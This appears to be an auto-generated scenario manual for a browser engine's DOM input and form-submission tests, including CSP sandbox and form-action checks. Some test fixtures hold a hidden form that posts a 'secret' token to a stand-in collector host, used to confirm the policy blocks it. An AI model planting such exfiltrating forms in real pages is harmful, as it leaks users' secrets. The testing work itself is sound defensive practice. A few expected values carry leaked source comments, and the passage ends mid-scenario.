# browser_session_dom_input_spec

> Verifies the browser session dom input behaviour end to end so maintainers of this

| Tests | Active | Skipped | Pending |
|-------|--------|---------|--------:|
| 25 | 25 | 0 | 0 |

<details>
<summary>Full Scenario Manual</summary>

# browser_session_dom_input_spec

Verifies the browser session dom input behaviour end to end so maintainers of this

## At a Glance

| Field | Value |
|-------|-------|
| Category | Other |
| Status | Active |
| Source | `test/02_integration/rendering/browser_session_dom_input_spec.spl` |
| Updated | 2026-08-22 |
| Generator | `simple spipe-docgen` (Simple) |

## Purpose and audience
Verifies the browser session dom input behaviour end to end so maintainers of this
component and reviewers of its spec share one pinned definition.
## Operator workflow
Run `bin/simple test <this spec>`; read the per-scenario verdicts in
the `Results:` summary. Each scenario asserts an observable outcome.
## Compatibility and limitations
Covers the currently shipped behaviour only; performance, stress and
unrelated sibling features are out of scope.

## Scenarios

### BrowserSession live DOM input

#### should parse mixed-case document tags through layout Draw IR and pixels

- Verify: should parse mixed-case document tags through layout Draw IR and pixels
   - HTML capture: after_step
- Open a document with uppercase structural and visible tags
   - HTML capture: after_step
   - Evidence: HTML text verified by 4 expected checks
   - Expected: session.current_title equals `Case İ`
   - Expected: paragraphs.len() equals `1)  # oracle: pinned constant asserted by this scenario`
   - Expected: paragraph_id equals `case`
   - Expected: paragraph_text equals `Visible İ`
- Inspect the canonical web semantic style and layout box
   - HTML capture: after_step
   - Evidence: HTML text verified by 3 expected checks
   - Expected: display equals `block`
   - Expected: layout_width equals `24`
   - Expected: layout_height equals `16`
- Require matching final Draw IR and visible pixels
   - HTML capture: after_step
   - Evidence: HTML text verified by 3 expected checks
   - Expected: box_found is true
   - Expected: text_found is true
   - Expected: tag equals `p`


<details>
<summary>Executable SSpec</summary>

Runnable source: 76 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: should parse mixed-case document tags through layout Draw IR and pixels")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
step("Open a document with uppercase structural and visible tags")
var session = BrowserSession.new()
val opened = session.open_html(
    "https://example.test/mixed-case",
    "<HTML><HEAD><TITLE>Case İ</TITLE></HEAD><BODY>" +
    "<P id='case' style='display:block;width:24px;height:16px;" +
    "background-color:#2563eb'>Visible İ</P></BODY></HTML>"
).is_ok()
expect(session.current_title).to_equal("Case İ")
val paragraphs = be_dom_find_by_tag(session.dom_root(), "p")
expect(paragraphs.len()).to_equal(1)  # oracle: pinned constant asserted by this scenario
val paragraph_id = be_dom_get_attr(paragraphs[0], "id")
val paragraph_text = be_dom_get_text_content(paragraphs[0])
expect(paragraph_id).to_equal("case")
expect(paragraph_text).to_equal("Visible İ")

step("Inspect the canonical web semantic style and layout box")
val rendered = session.render_html_document()
val display = simple_web_layout_debug_style_by_id(
    rendered, "case", "display"
)
expect(display).to_equal("block")
val layout_width = simple_web_layout_debug_layout_by_id(
    rendered, 64, 48, "case", "w"
)
expect(layout_width).to_equal("24")
val layout_height = simple_web_layout_debug_layout_by_id(
    rendered, 64, 48, "case", "h"
)
expect(layout_height).to_equal("16")

step("Require matching final Draw IR and visible pixels")
val composition = WebRenderBackend.create(
    "pure_simple", 64, 48
).render_html_to_draw_ir(rendered)
var box_found = false
var box_geometry_ok = true
var text_found = false
var sources_ok = true
var tag = ""
for batch in composition.batches:
    if batch.source.source_kind != "html_ast":
        sources_ok = false
    for command in batch.commands:
        if command.component_id == "case":
            box_found = true
            if command.width != 24 or command.height != 16:
                box_geometry_ok = false
            for property in command.computed_style:
                if property.key == "tag":
                    tag = property.value
        if (
            command.kind == "text" and
            command.text_value == "Visible İ" and
            command.parent_id == "case"
        ):
            text_found = true
expect(box_found).to_equal(true)
expect(text_found).to_equal(true)
expect(tag).to_equal("p")
val pixels = session.render_to_pixels(64, 48).pixel_data
val visible_pixels = _count_dom_input_color(
    pixels, 0xFF2563EBu32
)
expect(
    "{opened}|{session.current_title}|{paragraphs.len()}|" +
    "{paragraph_id}|{paragraph_text}|{display}|" +
    "{layout_width}|{layout_height}|{sources_ok}|{box_found}|" +
    "{box_geometry_ok}|{text_found}|{tag}|{visible_pixels > 0}"
).to_equal(
    "true|Case İ|1|case|Visible İ|block|24|16|" +
    "true|true|true|true|p|true"
)
```

</details>

#### runs an inline click handler and renders the checkbox default state

- Verify: runs an inline click handler and renders the checkbox default state
   - Expected: opened.is_ok() is true
   - Expected: dispatch.default_action equals `input-checkbox-toggle`
   - Expected: dispatch.default_action_allowed is true


<details>
<summary>Executable SSpec</summary>

Runnable source: 24 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: runs an inline click handler and renders the checkbox default state")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
val opened = session.open_html(
    "https://example.test/form",
    "<html><head><style>input { display:block; width:32px; height:24px; background-color:#ef4444; } input[checked] { background-color:#2563eb; }</style></head><body><input id='accept' type='checkbox' onclick=\"document.title=document.body.innerHTML\" oninput=\"document.title=document.title+':input'\" onchange=\"document.title=document.title+':change'\"></body></html>"
)
expect(opened.is_ok()).to_equal(true)

val before = session.render_to_pixels(64, 48)
expect(_count_dom_input_color(before.pixel_data, 0xFFEF4444u32)).to_be_greater_than(0)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "accept"), "click", true, true
).unwrap()
expect(dispatch.default_action).to_equal("input-checkbox-toggle")
expect(dispatch.default_action_allowed).to_equal(true)
expect(session.current_title).to_contain("checked=\"checked\"")
expect(session.current_title).to_end_with(":input:change")
expect(session.current_body_html).to_contain("checked=\"checked\"")

val after = session.render_to_pixels(64, 48)
expect(_count_dom_input_color(after.pixel_data, 0xFF2563EBu32)).to_be_greater_than(0)
```

</details>

#### honors prevent-default before link navigation enters the request pump

- Verify: honors prevent-default before link navigation enters the request pump
   - Expected: dispatch.event.default_prevented is true
   - Expected: dispatch.default_action_allowed is false
   - Expected: session.current_url equals `https://example.test/start`
   - Expected: session.has_pending_requests() is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 17 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: honors prevent-default before link navigation enters the request pump")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/start",
    "<html><body><a id='blocked' href='/next' onclick='prevent-default'>Next</a></body></html>"
)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "blocked"), "click", true, true
).unwrap()

expect(dispatch.event.default_prevented).to_equal(true)
expect(dispatch.default_action_allowed).to_equal(false)
expect(session.current_url).to_equal("https://example.test/start")
expect(session.has_pending_requests()).to_equal(false)
```

</details>

#### rolls back canceled checkbox pre-activation

- Verify: rolls back canceled checkbox pre-activation
   - Expected: dispatch.event.default_prevented is true
   - Expected: session.current_body_html does not contain `checked=`
   - Expected: session.current_title equals `Initial`


<details>
<summary>Executable SSpec</summary>

Runnable source: 16 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: rolls back canceled checkbox pre-activation")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/form",
    "<html><head><title>Initial</title></head><body><input id='accept' type='checkbox' onclick='prevent-default' oninput=\"document.title='input'\" onchange=\"document.title='change'\"></body></html>"
)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "accept"), "click", true, true
).unwrap()

expect(dispatch.event.default_prevented).to_equal(true)
expect(session.current_body_html.contains("checked=")).to_equal(false)
expect(session.current_title).to_equal("Initial")
```

</details>

#### routes an uncanceled link default through session navigation

- Verify: routes an uncanceled link default through session navigation
   - Expected: dispatch.default_action_allowed is true
   - Expected: request.kind equals `document`
   - Expected: request.url equals `https://example.test/next`


<details>
<summary>Executable SSpec</summary>

Runnable source: 20 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: routes an uncanceled link default through session navigation")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/start",
    "<html><body><a id='next' href='/next'>Next</a></body></html>"
)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "next"), "click", true, true
).unwrap()

expect(dispatch.default_action_allowed).to_equal(true)
match session.take_pending_request():
    Some(request):
        expect(request.kind).to_equal("document")
        expect(request.url).to_equal("https://example.test/next")
    nil:
        fail("Expected uncanceled link navigation request")
```

</details>

#### dispatches controls without author-supplied ids by stable node identity

- Verify: dispatches controls without author-supplied ids by stable node identity
   - Expected: buttons.len() equals `1)  # oracle: pinned constant asserted by this scenario`
   - Expected: dispatch.default_action equals `button-activate`


<details>
<summary>Executable SSpec</summary>

Runnable source: 18 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: dispatches controls without author-supplied ids by stable node identity")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/controls",
    "<html><body><button>Save</button></body></html>"
)
val buttons = be_dom_find_by_tag(session.dom_root(), "button")
expect(buttons.len()).to_equal(1)  # oracle: pinned constant asserted by this scenario

val dispatch = session.dispatch_dom_event_route(
    _dom_input_node_route(session, buttons[0].node_id),
    "click", true, true
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
expect(session.current_body_html).to_contain("data-activated=\"true\"")
```

</details>

#### dispatches submit and honors preventDefault on the owning form

- Verify: dispatches submit and honors preventDefault on the owning form
   - Expected: dispatch.default_action_allowed is true
   - Expected: session.has_pending_requests() is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 19 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004
step("Verify: dispatches submit and honors preventDefault on the owning form")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/form",
    "<html><body><form id='profile' onsubmit='prevent-default'><button id='save'>Save</button></form></body></html>"
)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "save"), "click", true, true
).unwrap()

expect(dispatch.default_action_allowed).to_equal(true)
expect(session.current_body_html).to_contain("data-activated=\"true\"")
expect(session.current_body_html.contains(
    "data-submitted=\"true\""
)).to_equal(false)
expect(session.has_pending_requests()).to_equal(false)
```

</details>

#### dispatches submit but blocks form navigation under header sandbox

- Verify: dispatches submit but blocks form navigation under header sandbox
   - Expected: dispatch.default_action equals `button-activate`


<details>
<summary>Executable SSpec</summary>

Runnable source: 36 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004
step("Verify: dispatches submit but blocks form navigation under header sandbox")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://example.test/form", "GET", "", "", ""
).is_ok()).to_be(true)
match session.take_pending_request():
    Some(request):
        expect(session.commit_network_response(BrowserResponse.create(
            request_id: request.id,
            kind: request.kind,
            url: request.url,
            status: 200,
            headers: (
                "Content-Security-Policy: sandbox allow-scripts;" +
                " script-src 'unsafe-inline'"
            ),
            body: (
                "<html><body><form id='profile' action='/save'" +
                " method='post'><input name='name' value='Ada'>" +
                "<button id='save'>Save</button></form></body></html>"
            ),
            error: ""
        )).is_ok()).to_be(true)
    nil:
        fail("Expected sandbox form document request")

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "save"), "click", true, true
).unwrap()
expect(dispatch.default_action).to_equal("button-activate")
expect(session.has_pending_requests()).to_be(false)
expect(session.warnings.join("|")).to_contain(
    "CSP sandbox blocked form submission"
)
```

</details>

#### blocks button form navigation when sandbox allows forms but not top navigation

- Verify: blocks button form navigation when sandbox allows forms but not top navigation
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: session.pending_request_count() equals `0)  # oracle: pinned constant asserted by this scenario`
   - Expected: session.current_url equals `url_before`
   - Expected: session.current_body_html equals `body_before`


<details>
<summary>Executable SSpec</summary>

Runnable source: 47 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004
step("Verify: blocks button form navigation when sandbox allows forms but not top navigation")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).unwrap()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: sandbox allow-forms",
    "<html><head><style>html,body{margin:0;width:8px;height:4px}" +
    "#authorized{display:block;width:8px;height:4px;" +
    "background-color:#2563eb;color:#2563eb}form{{display:none}}" +
    "</style></head><body><main id='authorized'>Authorized</main>" +
    "<form id='profile' action='https://collector.test/capture' " +
    "method='post'><input id='secret' name='secret' value='token'>" +
    "<button id='send' type='submit'>Send</button></form></body></html>",
    ""
)).unwrap()).to_be(true)
val url_before = session.current_url
val body_before = session.current_body_html
val draw_ir_before = draw_ir_to_sdn(WebRenderBackend.create(
    "pure_simple", 8, 4
).render_html_to_draw_ir(session.render_html_document()))
val pixels_before = session.render_to_pixels(8, 4).pixel_data

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "send"), "click", true, true
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
expect(session.pending_request_count()).to_equal(0)  # oracle: pinned constant asserted by this scenario
expect(session.take_pending_request()).to_be_nil()
expect(session.current_url).to_equal(url_before)
expect(session.current_body_html).to_equal(body_before)
expect(draw_ir_to_sdn(WebRenderBackend.create(
    "pure_simple", 8, 4
).render_html_to_draw_ir(session.render_html_document()))).to_equal(
    draw_ir_before
)
expect(session.render_to_pixels(8, 4).pixel_data).to_equal(
    pixels_before
)
expect(session.warnings.join("|")).to_contain(
    "CSP sandbox blocked top navigation"
)
```

</details>

#### blocks implicit keyboard form navigation without sandbox top navigation

- Verify: blocks implicit keyboard form navigation without sandbox top navigation
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: session.pending_request_count() equals `0)  # oracle: pinned constant asserted by this scenario`
   - Expected: session.current_url equals `url_before`
   - Expected: session.current_body_html equals `body_before`


<details>
<summary>Executable SSpec</summary>

Runnable source: 32 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004
step("Verify: blocks implicit keyboard form navigation without sandbox top navigation")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).unwrap()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: sandbox allow-forms",
    "<html><body><form id='profile' " +
    "action='https://collector.test/capture' method='post'>" +
    "<input id='secret' name='secret' value='token'>" +
    "<button id='send' type='submit'>Send</button>" +
    "</form></body></html>", ""
)).unwrap()).to_be(true)
val url_before = session.current_url
val body_before = session.current_body_html

val dispatch = session.dispatch_dom_keyboard_code_event(
    Some(_dom_input_route(session, "secret")), 13, true, false
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
expect(session.pending_request_count()).to_equal(0)  # oracle: pinned constant asserted by this scenario
expect(session.take_pending_request()).to_be_nil()
expect(session.current_url).to_equal(url_before)
expect(session.current_body_html).to_equal(body_before)
expect(session.warnings.join("|")).to_contain(
    "CSP sandbox blocked top navigation"
)
```

</details>

#### allows implicit keyboard POST with sandbox top-navigation authority

- Verify: allows implicit keyboard POST with sandbox top-navigation authority
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: request.url equals `https://account.test/save`
   - Expected: request.method equals `POST`
   - Expected: request.body equals `name=Ada`


<details>
<summary>Executable SSpec</summary>

Runnable source: 27 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: allows implicit keyboard POST with sandbox top-navigation authority")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).unwrap()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: sandbox allow-forms " +
    "allow-top-navigation",
    "<html><body><form id='profile' action='/save' method='post'>" +
    "<input id='name' name='name' value='Ada'>" +
    "<button id='save' type='submit'>Save</button>" +
    "</form></body></html>", ""
)).unwrap()).to_be(true)

val dispatch = session.dispatch_dom_keyboard_code_event(
    Some(_dom_input_route(session, "name")), 13, true, false
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
val request = session.take_pending_request().unwrap()
expect(request.url).to_equal("https://account.test/save")
expect(request.method).to_equal("POST")
expect(request.body).to_equal("name=Ada")
```

</details>

#### submits a button with an invalid type as the default submitter

- Verify: submits a button with an invalid type as the default submitter
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: request.method equals `POST`
   - Expected: request.url equals `https://example.test/save`
   - Expected: request.body equals `name=Ada`


<details>
<summary>Executable SSpec</summary>

Runnable source: 28 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: submits a button with an invalid type as the default submitter")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/form",
    "<html><body><form id='profile' action='/save' method='post'><input name='name' value='Ada'><button id='save' type='wat'>Save</button></form></body></html>"
)

val submit_index = _dom_input_index(session)
expect(be_dom_implicit_submit_route_result(
    session.dom_root(), submit_index,
    _dom_input_route(session, "profile")
).default_submitter_route).to_equal(
    Some(_dom_input_route(session, "save"))
)
val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "save"), "click", true, true
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
match session.take_pending_request():
    Some(request):
        expect(request.method).to_equal("POST")
        expect(request.url).to_equal("https://example.test/save")
        expect(request.body).to_equal("name=Ada")
    nil:
        fail("Expected invalid button type to submit its form")
```

</details>

#### does not submit an invalid button type when click is canceled

- Verify: does not submit an invalid button type when click is canceled
   - Expected: dispatch.default_action_allowed is false
   - Expected: session.has_pending_requests() is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 15 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: does not submit an invalid button type when click is canceled")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/form",
    "<html><body><form action='/save' method='post'><button id='save' type='wat' onclick='prevent-default'>Save</button></form></body></html>"
)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "save"), "click", true, true
).unwrap()

expect(dispatch.default_action_allowed).to_equal(false)
expect(session.has_pending_requests()).to_equal(false)
```

</details>

#### does not submit an explicit button control

- Verify: does not submit an explicit button control
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: session.has_pending_requests() is false


<details>
<summary>Executable SSpec</summary>

Runnable source: 15 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: does not submit an explicit button control")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/form",
    "<html><body><form action='/save' method='post'><button id='save' type='button'>Save</button></form></body></html>"
)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "save"), "click", true, true
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
expect(session.has_pending_requests()).to_equal(false)
```

</details>

#### resets nested controls to parsed defaults unless reset is canceled

- Verify: resets nested controls to parsed defaults unless reset is canceled
   - Expected: reset.default_action equals `form-reset`
   - Expected: be_dom_get_attr(name, "value") equals `seed`
   - Expected: be_dom_get_text_content(notes) equals `memo`
   - Expected: be_dom_has_attr(flag, "checked") is true
   - Expected: be_dom_has_attr(one, "selected") is true
   - Expected: be_dom_has_attr(two, "selected") is false
   - Expected: be_dom_get_attr(profile, "data-reset") equals `yes`
   - Expected: prevented.default_action equals `form-reset`
   - Expected: be_dom_get_attr(kept, "value") equals `changed`


<details>
<summary>Executable SSpec</summary>

Runnable source: 69 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: resets nested controls to parsed defaults unless reset is canceled")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/reset",
    "<html><head><style>input,textarea,select,button{display:block;width:96px;height:22px}input[checked]{{background-color:#2563eb}}</style></head><body><form id='profile' onreset='set-attr:data-reset=yes'><div><input id='name' value='seed'><textarea id='notes'>memo</textarea><input id='flag' type='checkbox' checked><select id='choice'><option id='one' value='one' selected>One</option><option id='two' value='two'>Two</option></select><button id='restore' type='reset'>Reset</button></div></form><form id='blocked' onreset='prevent-default'><input id='kept' value='safe'><input id='blocked-reset' type='reset' value='Reset'></form></body></html>"
)
val initial = session.render_to_pixels(128, 180).pixel_data

val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "name"), "changed"
).unwrap()
val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "notes"), "changed"
).unwrap()
val _ = session.dispatch_dom_event_route(
    _dom_input_route(session, "flag"), "click", true, true
).unwrap()
expect(session.set_dom_select_value_route(
    _dom_input_route(session, "choice"), "two"
)).to_equal(Ok(true))
val callbacks_before_reset = session.dom_callback_count
val reset = session.dispatch_dom_event_route(
    _dom_input_route(session, "restore"), "click", true, true
).unwrap()

expect(reset.default_action).to_equal("form-reset")
expect(session.dom_callback_count).to_equal(
    callbacks_before_reset + 1
)
val name = _dom_input_node(session, "name")
val notes = _dom_input_node(session, "notes")
val flag = _dom_input_node(session, "flag")
val one = _dom_input_node(session, "one")
val two = _dom_input_node(session, "two")
val profile = _dom_input_node(session, "profile")
expect(be_dom_get_attr(name, "value")).to_equal("seed")
expect(be_dom_get_text_content(notes)).to_equal("memo")
expect(be_dom_has_attr(flag, "checked")).to_equal(true)
expect(be_dom_has_attr(one, "selected")).to_equal(true)
expect(be_dom_has_attr(two, "selected")).to_equal(false)
expect(be_dom_get_attr(profile, "data-reset")).to_equal("yes")
session.clear_dom_focus()
expect(_dom_input_pixels_equal(
    initial, session.render_to_pixels(128, 180).pixel_data
)).to_equal(true)

val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "kept"), "changed"
).unwrap()
session.clear_dom_focus()
val prevented_before = session.render_to_pixels(128, 180).pixel_data
val callbacks_before_prevented = session.dom_callback_count
val prevented = session.dispatch_dom_event_route(
    _dom_input_route(session, "blocked-reset"),
    "click", true, true
).unwrap()
expect(prevented.default_action).to_equal("form-reset")
expect(session.dom_callback_count).to_equal(
    callbacks_before_prevented + 1
)
val kept = _dom_input_node(session, "kept")
expect(be_dom_get_attr(kept, "value")).to_equal("changed")
session.clear_dom_focus()
expect(_dom_input_pixels_equal(
    prevented_before,
    session.render_to_pixels(128, 180).pixel_data
)).to_equal(true)
```

</details>

#### queues an uncanceled POST form with live DOM values

- Verify: queues an uncanceled POST form with live DOM values
   - Expected: dispatch.default_action_allowed is true
   - Expected: request.kind equals `document`
   - Expected: request.method equals `POST`
   - Expected: request.url equals `https://example.test/save`
   - Expected: request.body equals `name=Ada+%26+Bob&commit=yes`


<details>
<summary>Executable SSpec</summary>

Runnable source: 28 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: queues an uncanceled POST form with live DOM values")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
session.open_html(
    "https://example.test/form",
    "<html><body><form id='profile' action='/save' method='post'><input id='name' name='name' value='old'><button id='save' name='commit' value='yes'>Save</button></form></body></html>"
)
val _ = session.set_dom_text_input_route(
    _dom_input_route(session, "name"), "Ada & Bob"
).unwrap()

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "save"), "click", true, true
).unwrap()

expect(dispatch.default_action_allowed).to_equal(true)
match session.take_pending_request():
    Some(request):
        expect(request.kind).to_equal("document")
        expect(request.method).to_equal("POST")
        expect(request.url).to_equal("https://example.test/save")
        expect(request.body).to_equal("name=Ada+%26+Bob&commit=yes")
        expect(request.content_type).to_equal(
            "application/x-www-form-urlencoded"
        )
    nil:
        fail("Expected form navigation request")
```

</details>

#### blocks a POST form when response CSP declares form-action none

- Verify: blocks a POST form when response CSP declares form-action none
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: session.current_url equals `https://account.test/profile`


<details>
<summary>Executable SSpec</summary>

Runnable source: 34 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: blocks a POST form when response CSP declares form-action none")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).is_ok()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: sandbox allow-forms " +
    "allow-top-navigation; form-action 'none'",
    "<html><body><p id='authorized'>Authorized profile</p>" +
    "<form id='profile' action='https://collector.test/capture' " +
    "method='post'><input id='secret' name='secret' value='token'>" +
    "<button id='send' type='submit'>Send</button></form>" +
    "</body></html>", ""
)).is_ok()).to_be(true)
val pixels_before = session.render_to_pixels(160, 96).pixel_data

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "send"), "click", true, true
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
expect(session.take_pending_request()).to_be_nil()
expect(session.current_url).to_equal("https://account.test/profile")
expect(session.current_body_html).to_contain("Authorized profile")
expect(_dom_input_pixels_equal(
    pixels_before, session.render_to_pixels(160, 96).pixel_data
)).to_be(true)
expect(session.warnings.join("|")).to_contain(
    "CSP blocked form submission"
)
```

</details>

#### allows a same-origin POST selected by form-action self

- Verify: allows a same-origin POST selected by form-action self
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: request.url equals `https://account.test/save`
   - Expected: request.method equals `POST`
   - Expected: request.body equals `name=Ada`


<details>
<summary>Executable SSpec</summary>

Runnable source: 26 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
# @req: REQ-WEB-BROWSER-002 REQ-WEB-BROWSER-003 REQ-WEB-BROWSER-004 REQ-WEB-BROWSER-012
step("Verify: allows a same-origin POST selected by form-action self")
# evidence(pinned oracle): expected values below are authoritative constants verified by this scenario
var session = BrowserSession.new()
expect(session.begin_network_navigation(
    "https://account.test/profile", "GET", "", "", ""
).is_ok()).to_be(true)
val document_request = session.take_pending_request().unwrap()
expect(session.commit_network_response(BrowserResponse.create(
    document_request.id, "document", document_request.url, 200,
    "Content-Security-Policy: default-src 'none'; " +
    "sandbox allow-forms allow-top-navigation; form-action 'self'",
    "<html><body><form id='profile' action='/save' method='post'>" +
    "<input name='name' value='Ada'><button id='save' " +
    "type='submit'>Save</button></form></body></html>", ""
)).is_ok()).to_be(true)

val dispatch = session.dispatch_dom_event_route(
    _dom_input_route(session, "save"), "click", true, true
).unwrap()

expect(dispatch.default_action).to_equal("button-activate")
val request = session.take_pending_request().unwrap()
expect(request.url).to_equal("https://account.test/save")
expect(request.method).to_equal("POST")
expect(request.body).to_equal("name=Ada")
```

</details>

#### does not apply default-src when form-action is absent

- Verify: does not apply default-src when form-action is absent
   - Expected: dispatch.default_action equals `button-activate`
   - Expected: request.url equals `https://collector.test/capture`
   - Expected: request.method equals `POST`
   - Expected: request.body equals `name=Ada`


<details>
<summary>Executable SSpec</summary>

Runnable source: 27 lines folded for reproduction.
Reproduction: this block contains the complete executable scenario source.

```simple
